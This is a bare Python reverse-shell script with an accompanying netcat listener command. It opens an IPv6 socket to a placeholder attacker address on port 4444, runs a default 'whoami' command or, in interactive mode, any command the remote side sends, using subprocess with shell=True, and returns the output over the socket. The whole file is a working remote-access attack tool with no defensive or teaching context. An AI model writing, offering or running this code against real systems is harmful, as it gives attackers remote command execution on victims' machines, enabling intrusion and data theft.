# Setup listener:
# nc -6 -lvp 4444

import socket
import subprocess
import argparse

# CONFIGURATION
SERVER = "<attacker-ipv6>"  # Replace with attacker's IPv6 address
PORT = 4444    # Change this to match attacker's listening port
COMMAND = "whoami"  # Default command to execute

# ARGUMENT PARSER
parser = argparse.ArgumentParser()
parser.add_argument("--interactive", action="store_true", help="Enable interactive shell mode")
args = parser.parse_args()

# CREATE SOCKET
client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

try:
    print(f"[+] Connecting to [{SERVER}]:{PORT}...")
    client.connect((SERVER, PORT))
    
    if args.interactive:
        print("[+] Interactive shell enabled.")
        while True:
            command = client.recv(1024).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break
            if command:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                client.sendall(output.encode() or b"No output\n")
    else:
        print(f"[+] Executing command: {COMMAND}")
        result = subprocess.run(COMMAND, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        client.sendall(output.encode() or b"No output\n")
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    client.close()
    print("[+] Connection closed.")

